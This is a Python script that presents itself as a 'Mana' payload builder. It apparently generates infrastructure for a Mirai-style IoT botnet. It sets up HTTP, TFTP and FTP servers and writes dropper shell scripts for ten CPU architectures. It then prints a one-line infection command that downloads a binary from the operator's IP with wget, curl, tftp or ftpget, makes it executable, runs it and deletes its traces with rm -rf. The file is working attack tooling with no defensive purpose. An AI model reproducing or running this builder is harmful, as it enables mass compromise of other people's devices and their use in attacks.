#building a payload guysssssss
# Mana Was Created By The Goddess Kasaya The Kitty "rawr"

print("\x1b[0;31m _____________________________________\x1b[0m")
print("\x1b[0;31m|                                     |\x1b[0m")
print("\x1b[0;31m|        \x1b[0;95mMana \x1b[0;31mPAYLOAD BUILDER         |\x1b[0m")
print("\x1b[0;31m|          \x1b[0;96mMade By \x1b[0;95mKasaya \x1b[0;32m<3          \x1b[0;31m|\x1b[0m")
print("\x1b[0;31m|_____________________________________|\x1b[0m")

print("\x1b[0;90m  ,;:'`'::' \x1b[0m")
print("\x1b[0;95m        __|| \x1b[0m")
print("\x1b[0;95m  _____/LLLL\_ \x1b[0m")
print("\x1b[0;95m  \__________ |  \x1b[0m")
print("\x1b[0;34m~^~^~^~^~^~^~^~^~^~ \x1b[0m")


import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "awoo"
exec_name = "OPI"
bin_prefix = "loligang."
bin_directory = "lmaoWTF"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm4",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"sh4"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[01;36m Gathering Random Stuff To Make Your Payload Dood")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\033[01;31m Creating Some Weird .sh Bin Thingies For You")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/Pemex.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Pemex.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Pemex.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/Pemex2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Pemex2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Pemex2.sh')
run('echo "#!/bin/bash" > /var/www/html/Pemex.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Pemex2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Pemex2.sh')
run('echo "#!/bin/bash" > /var/ftp/Pemex1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/Pemex1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/Pemex1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/www/html/Pemex.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/ftp/Pemex1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/Pemex.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/Pemex2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;35mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Pemex.sh; curl -O http://" + ip + "/Pemex.sh; chmod 777 Pemex.sh; sh Pemex.sh; tftp " + ip + " -c get Pemex.sh; chmod 777 Pemex.sh; sh Pemex.sh; tftp -r Pemex2.sh -g " + ip + "; chmod 777 Pemex2.sh; sh Pemex2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " Pemex1.sh Pemex1.sh; sh Pemex1.sh; rm -rf Pemex.sh Pemex.sh Pemex2.sh Pemex1.sh; rm -rf *\x1b[0m")
print("")
raw_input("\033[01;32mThere's Your Payload :)\033[0m")
